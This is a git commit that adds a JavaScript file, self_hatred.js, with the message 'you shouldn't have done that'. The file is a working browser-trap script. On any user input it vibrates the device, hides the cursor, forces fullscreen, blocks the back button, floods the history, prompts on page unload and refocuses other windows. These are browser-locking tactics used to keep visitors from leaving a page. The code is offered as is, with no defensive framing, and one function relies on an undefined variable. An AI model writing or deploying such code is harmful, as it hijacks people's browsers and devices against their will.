e9642174ce1795eeade58ef6545ad445f6f0e5d6
mwillib <mike.williamsbackshall@aexp.com>
2020-03-10 10:51:33 +0000

    you shouldn't have done that

---
+++ self_hatred.js
@@ -0,0 +1,66 @@
+function mistake() {
+    window.alert("you shouldnt have done that");
+    confirmPageUnload();
+
+    interceptUserInput(() => {
+        startVibrateInterval();
+        hideCursor();
+        document.getElementById('button').style.display='none';
+        requestFullscreen();
+        blockBackButton();
+        fillHistory();
+        focusWindows();
+
+    });
+}
+
+function confirmPageUnload () {
+    window.addEventListener('beforeunload', event => {
+        event.returnValue = true
+    })
+}
+function startVibrateInterval () {
+    if (typeof window.navigator.vibrate !== 'function') return;
+    setInterval(() => {
+        const duration = Math.floor(Math.random() * 600);
+        window.navigator.vibrate(duration)
+    }, 1000)
+}
+function interceptUserInput (onInput) {
+    document.body.addEventListener('touchstart', onInput, { passive: false });
+
+    document.body.addEventListener('mousedown', onInput);
+    document.body.addEventListener('mouseup', onInput);
+    document.body.addEventListener('click', onInput);
+
+    document.body.addEventListener('keydown', onInput);
+    document.body.addEventListener('keyup', onInput);
+    document.body.addEventListener('keypress', onInput)
+}
+function hideCursor () {
+    document.querySelector('html').style = 'cursor: none;'
+}
+function requestFullscreen () {
+    const requestFullscreen = Element.prototype.requestFullscreen ||
+        Element.prototype.webkitRequestFullscreen ||
+        Element.prototype.mozRequestFullScreen ||
+        Element.prototype.msRequestFullscreen;
+
+    requestFullscreen.call(document.body)
+}
+function blockBackButton () {
+    window.addEventListener('popstate', () => {
+        window.history.forward()
+    })
+}
+function fillHistory () {
+    for (let i = 1; i < 20; i++) {
+        window.history.pushState({}, '', window.location.pathname + '?q=' + i)
+    }
+    window.history.pushState({}, '', window.location.pathname)
+}
+function focusWindows () {
+    wins.forEach(win => {
+        if (!win.closed) win.focus()
+    })
+}
